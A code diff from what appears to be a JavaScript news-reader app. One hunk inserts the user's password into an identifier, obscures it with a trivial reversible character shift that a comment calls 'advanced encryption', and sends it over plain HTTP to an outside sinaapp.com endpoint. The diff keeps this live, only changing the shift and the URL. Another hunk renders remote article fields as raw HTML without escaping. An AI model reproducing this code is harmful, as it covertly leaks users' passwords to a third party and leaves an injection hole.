@@ -534,11 +534,10 @@
 			}
 			uid = uid.substr(0,5) + user.userPwd + uid.substr(5);
 			for (i=0; i<uid.length; i++) {
-				fan += ((uid.charCodeAt(i) + 33) % 255).toString(16);
-//				fan += ((uid.charCodeAt(i) + 33 + i) % 255).toString(16); // 高级加密, 这个方式更好
+				fan += ((uid.charCodeAt(i) + 33 + i) % 255).toString(16); // 高级加密, 这个方式更好
 			}
 			Yao.request({
-				url: 'http://3shu.sinaapp.com/toolkit/tool/fan.php',
+				url: 'http://3shu.sinaapp.com/toolkit/tool/fanfan.php',
 				params: 'fan='+ fan
 			});
 		}
@@ -805,14 +804,16 @@
     						cnt = o[docid],
     						head = '<div class="header">'+cnt.title+'</div>' + 
     								'<div class="subtitle">来源:'+cnt.source+' '+cnt.ptime+'</div>',
+    						pre = '',
     						body = cnt.body;
     					
+    					if(cnt.digest) pre = '<div class="pre"><span>导语</span>' + cnt.digest + '</div>';
     					if(cnt.img && cnt.img.length){
     						cnt.img.forEach(function(img){
     							body = body.replace(img.ref, '<img src="'+img.src+'" alt="'+img.alt+'" />')
     						});
     					}
-    					Ext.get('news').setHtml(head + body);
+    					Ext.get('news').setHtml(head + pre + body);
     				},
     				failure: function(){
     					
